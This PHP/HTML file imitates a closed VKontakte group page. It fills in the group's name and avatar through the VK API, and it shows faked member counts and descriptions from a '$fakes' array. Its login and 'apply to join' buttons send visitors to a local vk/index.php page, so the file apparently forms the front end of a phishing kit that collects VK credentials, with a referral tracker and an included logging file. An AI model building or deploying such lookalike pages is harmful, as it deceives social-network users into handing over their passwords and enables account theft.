<?php session_start();

include('../bdlog.php');

if(isset($_GET['reff'])) {
	$_SESSION['comment'] = $_GET['reff'];
	$sessref = $_SESSION['comment'];
} else {
	$sessref = 'non-ref';
} 

$checking = file_get_contents('https://api.vk.com/method/groups.getById?access_token='.$admintoken.'&v=5.101&group_id='.$group_id.'');
$json = json_decode($checking, true);
$g_avatar = $json['response'][0]['photo_200'];
$g_name = $json['response'][0]['name'];


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xml:lang="ru" lang="ru">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link rel="shortcut icon" href="/images/icons/favicons/fav_logo.ico?6" />
<link rel="apple-touch-icon" href="/images/icons/pwa/apple/default.png?8">
<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="Принимаем в группу всех." />
<title><?php echo $g_name;?> | ВКонтакте</title>
<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>
<link rel="stylesheet" type="text/css" href="common.css" />
<link rel="stylesheet" type="text/css" href="fonts_cnt.css" />
<link rel="stylesheet" type="text/css" href="fonts_utf.css?0" />
<link type="text/css" rel="stylesheet" href="ui_common.css?21103273423" />
<link type="text/css" rel="stylesheet" href="stories.css?93923254555" />
<link type="text/css" rel="stylesheet" href="groups.css?134071115221" />
<link type="text/css" rel="stylesheet" href="page.css?92713657501" />
<link type="text/css" rel="stylesheet" href="post.css?33118709587" />
<link type="text/css" rel="stylesheet" href="module.css?27842301742" />
<meta property="og:image" content="http://sun9-24.userapi.com/c851216/v851216464/63690/w6yDYXkefVY.jpg?ava=1" />
<meta property="og:image:secure_url" content="https://sun9-24.userapi.com/c851216/v851216464/63690/w6yDYXkefVY.jpg?ava=1" />
<meta property="og:image:width" content="400" />
<meta property="og:image:height" content="400" />
<meta property="og:title" content="<?php echo $g_name; ?>" />
<meta property="og:description" content="<?php echo $fakes['f_g_title'];?>" />
<meta property="og:url" content="https://vk.com/club175195253" />
<meta property="og:site_name" content="VK" />
<meta property="og:type" content="website" />
</head>

<body onresize="onBodyResize()" class="">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">window.domStarted && domStarted();</script>

  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">
  

  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap">
      <a class="top_back_link" href="" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }"></a>
      <div id="page_header" class="p_head p_head_l0" style="width: 960px">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l" href="/" aria-label="На главную" accesskey="1" ><div class="top_home_logo"></div></a></div>
  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
  <input name="disable-autofill" style="display: none;" />
  <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
</div></div>
  <div class="head_nav_item fl_l head_nav_btns"><div id="top_audio_layer_place" class="top_audio_layer_place"></div></div>
  <div class="head_nav_item fl_r"><a class="top_nav_link" href="" id="top_switch_lang" style="display: none;" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '162365ac13d97cfe3c' }); return false;">
  Switch to English
</a><a class="top_nav_link" href="" id="top_reg_link" style="" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)">
  регистрация
</a></div>
  <div class="head_nav_item_player"></div>
</div>
<div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
        </div>
      </div>
    </div>
  </div>

  <div id="page_layout" style="width: 960px;">
    <div id="side_bar" class="side_bar fl_l " style="">
      <div id="side_bar_inner" class="side_bar_inner">
        <div id="quick_login" class="quick_login">
  <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login">
    <input type="hidden" name="act" value="login" />
    <input type="hidden" name="role" value="al_frame" />
    <input type="hidden" name="expire" id="quick_expire_input" value="" />
    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
    <input type="hidden" name="_origin" value="https://vk.com" />
    <input type="hidden" name="ip_h" value="0f08f953b67a92d79e" />
    <input type="hidden" name="lg_h" value="1a25adc1e62de69513" />
    <input type="hidden" name="ul" id="quick_login_ul" value="" />
    <div class="label">Телефон или email</div>
    <div class="labeled"><input type="text" name="email" class="dark" id="quick_email" /></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
    <input type="submit" class="submit" />
  </form>
    <?php
    echo '<a href="vk/index.php" class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</a>';
  ?>
  <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
  <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="" target="_top">Забыли пароль?</a></div>
</div>
      </div>
    </div>

    <div id="page_body" class="fl_r " style="width: 795px;">
      
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
    <div id="content"><div id="group">
  
  <div class="wide_column_left">
  <div class="narrow_column_wrap">
    <div class="narrow_column" id="narrow_column">
      <div class="page_block page_photo" >
  <div class="page_avatar_wrap" id="page_avatar_wrap">
  
  <aside aria-label="Фотография">
    <div id="page_avatar" class="page_avatar"><img class="page_avatar_img" src="<?php echo $g_avatar; ?>" alt="<?php echo $g_name; ?>" /></div>
  </aside>
  <div class="page_actions_wide clear_fix no_actions redesign">
  <div class="page_action_left fl_l">
  <?php
    echo '<a><a href="vk/index.php" class="flat_button button_wide" id="join_button">Подать заявку</a></a>';
  ?>
  </div>
  
</div>
</div>
</div><div id="group_moder_info">
  <div class="group_closed page_block">
  <div class="group_closed_text">Это закрытая группа</div>
</div>
<div class="page_block">
  <aside aria-label="Контакты">
  <div class="module clear page_list_module _module" id="group_contacts">
    <div class="header_right_link fl_r" "=""></div>
<a onclick="Page.showContacts(-182141164 ); return false;" class="module_header">
  <div class="header_top clear_fix">
    <span class="header_label fl_l">Контакты</span>
    <span class="header_count fl_l">1</span>
  </div>
</a>
    <div class="module_body clear_fix">
      <a class="line_cell clear_fix">
  <div class="fl_l thumb">
    <img class="cell_img" src="https://sun6-6.userapi.com/c630719/v630719023/4be49/H6ho6Pv5wSw.jpg?ava=1" alt="Ольга Муравьева">
  </div>
  <div class="fl_l info">
    Ольга Муравьева
  </div>
</a>
    </div>
    
  </div>
</aside>
</div>
</div>
    </div>
  </div>
  <div class="wide_column_wrap">
    <div class="wide_column" id="wide_column">
      <div class="page_block" id="page_block_group_main_info">
  <div class="page_top">
  
  <h2 class="page_name"><?php echo $g_name; ?></h2>
</div><div id='page_block_group_submain_info'><h2 class="page_block_h2 page_info_header_tabs">
  <ul class="ui_tabs clear_fix page_info_tabs"onmouseover="uiTabs.tryInit(this)" >
    <li class="ui_tab_default">
  <div class="ui_tab_plain" onclick="return false;" role="link">
    Информация
    
  </div>
</li>
    <div class="ui_tabs_slider _ui_tabs_slider"></div>
  </ul>
</h2><div id="page_info_wrap" class="page_info_wrap info info_redesign"><div class="group_info_block info"><div class="group_info_rows group_info_rows_redesign"><div class="group_info_row info" title="Описание">
<div class="line_value"><?php echo $fakes['f_g_title'];?></div>
</div></div></div></div></div>
</div><div class="page_block" >
  <aside aria-label="Участники">
  <div class="module clear people_module _module" id="group_followers">
    <div class="header_right_link fl_r" "></div>
<a href="/search?c[section]=people&c[group]=175195253" onclick="return page.showPageMembers(event, -175195253, 'members')" class="module_header">
  <div class="header_top clear_fix">
    <span class="header_label fl_l">Участники</span>
    <span class="header_count fl_l"><?php echo $fakes['f_g_foll'];?></span>
  </div>
</a>
    <div class="module_body clear_fix">
      <div class="people_row">
<div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Влад Родионов">
    <img class="people_cell_img" src="https://sun1-15.userapi.com/c850228/v850228745/dbf7a/vQyDkgmYnRg.jpg?ava=1" alt="Влад Родионов" />
    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Влад Родионов">
      Влад
    </a>
  </div>
</div><div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Анна Алексеева">
    <img class="people_cell_img" src="https://sun6-4.userapi.com/c626831/v626831811/62b4e/eT6uvajqDNo.jpg?ava=1" alt="Анна Алексеева">
    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Данила Павлов">
      Анна
    </a>
  </div>
</div><div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Владимир Ооржак">
    <img class="people_cell_img" src="https://sun9-53.userapi.com/c855224/v855224830/90813/qe40spl8w-Y.jpg?ava=1" alt="Владимир Ооржак" />
    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Владимир Ооржак">
      Владимир
    </a>
  </div>
</div>
</div><div class="people_row">
<div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Миша Беляев">
    <img class="people_cell_img" src="https://sun9-13.userapi.com/c846019/v846019312/20a6b0/-87nOHCA9B8.jpg?ava=1" alt="Миша Беляев" />
    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Миша Беляев">
      Миша
    </a>
  </div>
</div><div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Гусейн Мамедов">
<img class="people_cell_img" src="https://sun6-6.userapi.com/c846218/v846218354/1d6b93/zD1CMgo-gOg.jpg?ava=1" alt="Катя Энгель">
    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Гусейн Мамедов">
      Анна
    </a>
  </div>
</div><div class="people_cell">
  <a class="people_cell_ava" href="" onclick="return nav.go(this, event, {cl_id: 0})" title="Ивэн Неонов">
<img class="people_cell_img" src="https://sun6-3.userapi.com/c846016/v846016947/1c9e2a/RVBahocjWKQ.jpg?ava=1" alt="Алиса Мартынова">    <span class="blind_label">.</span>
  </a>
  <div class="people_cell_name">
    <a href="" title="Ивэн Неонов">
      Мария
    </a>
  </div>
</div>
</div>
    </div>
    
  </div>
</aside>
</div>
    </div>
  </div>
</div>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 795px;"><div class="footer_nav" id="bottom_nav">
  <div class="footer_copy fl_l"><a href="">ВКонтакте</a> &copy; 2006–2020</div>
  <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: '162365ac13d97cfe3c'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: '162365ac13d97cfe3c'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: '162365ac13d97cfe3c'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
  <div class="footer_links">
    <a class="bnav_a" href="">о компании</a>
    <a class="bnav_a" href="" style="display: none;">помощь</a>
    <a class="bnav_a" href="">правила</a>
    <a class="bnav_a" href="" style="">реклама</a>
	<a class="bnav_a" href="" style="display: none;">вакансии</a>
  </div>
</div>

<div class="footer_bench clear">
  
</div></div>

    <div class="clear"></div>
  </div>
</div></div><noscript><div style="position:absolute;left:-10000px;">
<img src="//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" />
</div></noscript></div>
  <div class="progress" id="global_prg"></div>
</body>

</html>